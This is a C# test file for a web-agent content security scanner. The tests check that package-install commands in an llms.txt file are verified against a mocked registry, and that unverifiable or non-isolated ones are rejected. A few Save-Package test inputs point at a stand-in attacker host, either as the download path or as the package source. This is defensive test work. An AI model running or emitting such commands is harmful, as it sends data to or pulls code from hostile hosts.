using PowerForge.Web;

namespace PowerForge.Tests;

public sealed partial class WebAgentContentSecurityScannerTests
{
    [Theory]
    [InlineData("composer require vendor/package:1.0.0")]
    [InlineData("composer require vendor/package:1.0.0 --no-update --no-plugins")]
    [InlineData("composer require vendor/package:1.0.0 --no-update --no-scripts")]
    [InlineData("composer require vendor/package:1.0.0 --no-plugins --no-scripts")]
    [InlineData("bundle add safe-gem --version 1.0.0")]
    [InlineData("bundler add safe-gem --version 1.0.0")]
    [InlineData("python -P -m pip install safe-package==1.0.0 --skip-install")]
    public void Scan_RejectsProjectConsumingPackageMutationsWithoutIsolation(string command)
    {
        AssertWave43FailureWithoutRegistry(command, "PFAGENT.PACKAGE.UNVERIFIABLE_OPERAND");
    }

    [Theory]
    [InlineData("composer require --no-scripts vendor/package:1.0.0 --no-update --no-plugins", "packagist")]
    [InlineData("bundle add --skip-install safe-gem --version 1.0.0", "rubygems")]
    [InlineData("bundler add safe-gem --version 1.0.0 --skip-install", "rubygems")]
    [InlineData("Save-Package -Path . -Name Safe.Package -ProviderName NuGet -Source nuget.org -RequiredVersion 1.0.0", "nuget")]
    public void Scan_VerifiesIsolatedPackageMutationsAndDownloads(string command, string ecosystem)
    {
        using var handler = new RegistryHandler(_ => ecosystem switch
        {
            "packagist" => JsonResponse("""{"packages":{"vendor/package":[{"version":"1.0.0"}]}}"""),
            "rubygems" => JsonResponse("""{"version":"1.0.0"}"""),
            _ => JsonResponse("""{"versions":["1.0.0"]}""")
        });
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", command);
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });

            Assert.True(result.Success, string.Join(" | ", result.Findings.Select(static finding => finding.Message)));
            Assert.Equal(1, result.PackageReferenceCount);
            Assert.Equal(1, result.VerifiedPackageCount);
            Assert.Equal(1, handler.RequestCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }

    [Theory]
    [InlineData("Save-Package -Name Safe.Package -RequiredVersion 1.0.0")]
    [InlineData("Save-Package -Path . -Name Safe.Package -ProviderName NuGet -RequiredVersion 1.0.0")]
    [InlineData("Save-Package -Name Safe.Package -ProviderName NuGet -Source nuget.org -RequiredVersion 1.0.0")]
    [InlineData("Save-Package -Path https://attacker.example/out -Name Safe.Package -ProviderName NuGet -Source nuget.org -RequiredVersion 1.0.0")]
    [InlineData("Save-Package -Name Safe.Package -ProviderName NuGet -Source https://attacker.example/v3/index.json -RequiredVersion 1.0.0")]
    [InlineData("Save-Package -Name Safe.Package -ProviderName NuGet -RequiredVersion 1.0.0 -IncludeDependencies")]
    [InlineData("Save-Package -Name Safe.Package -ProviderName NuGet -RequiredVersion 1.0.0 -IncludeDependencies:$true")]
    [InlineData("Save-Package -Name Safe.Package -ProviderName NuGet -RequiredVersion 1.0.0 -ForceBootstrap")]
    [InlineData("Save-Package -Name Safe.Package -ProviderName NuGet -RequiredVersion 1.0.0 -ForceBootstrap:$true")]
    [InlineData("Save-Package -InputObject $package -ProviderName NuGet -RequiredVersion 1.0.0")]
    [InlineData("Save-Package -Name Safe.Package -ProviderName NuGet -RequiredVersion 1.0.0 @options")]
    public void Scan_RejectsUnverifiableSavePackageInputsWithoutRegistryLookup(string command)
    {
        AssertWave43FailureWithoutRegistry(command, null);
    }

    private static void AssertWave43FailureWithoutRegistry(string command, string? expectedCode)
    {
        using var handler = new RegistryHandler(_ => throw new InvalidOperationException("Registry must not be called."));
        using var scanner = new WebAgentContentSecurityScanner(new HttpClient(handler));
        var root = CreateArtifact("llms.txt", command);
        try
        {
            var result = scanner.Scan(new WebAgentContentSecurityOptions { SiteRoot = root, Files = ["llms.txt"] });

            Assert.False(result.Success);
            if (expectedCode is not null)
                Assert.Contains(result.Findings, finding => finding.Code == expectedCode);
            Assert.Equal(0, result.PackageReferenceCount);
            Assert.Equal(0, handler.RequestCount);
        }
        finally
        {
            TryDeleteDirectory(root);
        }
    }
}
